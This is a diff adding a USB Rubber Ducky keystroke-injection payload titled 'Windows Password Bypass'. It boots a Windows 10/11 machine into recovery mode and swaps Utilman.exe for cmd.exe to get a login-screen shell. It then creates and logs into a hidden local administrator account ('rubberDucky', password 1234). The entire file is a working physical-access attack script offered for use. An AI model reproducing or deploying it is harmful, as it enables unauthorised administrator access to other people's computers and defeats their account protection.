@@ -1,0 +1,122 @@
+REM Title: Windows Password Bypass
+REM Author: Tzur Soffer
+REM Description: Break into Windows 10 + 11
+REM Target: Windows 10, Windows 10
+REM Props: Hak5, Darren Kitchen, Korben
+REM Version: 2.2
+REM Category: General
+
+REM wait for Windows to accept keystrokes
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+DEFINE #ACCOUNT_PASSWORD 1234
+DEFINE #ACCOUNT_NAME rubberDucky
+
+REM get into safe mode
+STRING QQQQQQQQQ
+CTRL ALT DELETE
+DELAY 3000
+HOLD SHIFT
+TAB
+RELEASE SHIFT
+ENTER
+DELAY 100
+UP
+DELAY 200
+
+HOLD SHIFT
+DELAY 200
+HOLD SPACE
+DELAY 100
+RELEASE SPACE
+DELAY 100
+ENTER
+RELEASE SHIFT
+
+DELAY 60000
+REM ADD CMD to login page
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 1000
+TAB
+DELAY 50
+ENTER
+DELAY 1000
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 1000
+REM replace utilman.exe with cmd.exe
+
+REM Check each drive from C: to G: for Utilman.exe
+STRINGLN @echo off
+STRINGLN setlocal enabledelayedexpansion
+STRINGLN for %d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+STRINGLN     if exist %d:\Windows\System32\Utilman.exe (
+STRINGLN         echo Utilman.exe found in drive %d:
+STRINGLN         cd /d %d:\Windows\System32\
+STRINGLN     )
+STRINGLN )
+STRINGLN copy Utilman.exe  Utilman2.exe
+STRINGLN copy  cmd.exe  Utilman.exe /y
+
+STRINGLN exit
+DELAY 1000
+ENTER
+DELAY 60000
+
+REM go into shell from login page
+STRING QQQQQQQQQ
+DELAY 3000
+HOLD SHIFT
+TAB
+DELAY 50
+TAB
+RELEASE SHIFT
+ENTER
+DELAY 1000
+
+REM create new admin acount
+STRINGLN net user #ACCOUNT_NAME #ACCOUNT_PASSWORD /add
+STRINGLN net localgroup administrators #ACCOUNT_NAME /add
+STRINGLN shutdown /l
+DELAY 10000
+
+REM login to new user
+STRING QQQQQQQQQ
+DELAY 3000
+HOLD SHIFT
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+RELEASE SHIFT
+ENTER
+DELAY 500
+STRINGLN #ACCOUNT_PASSWORD
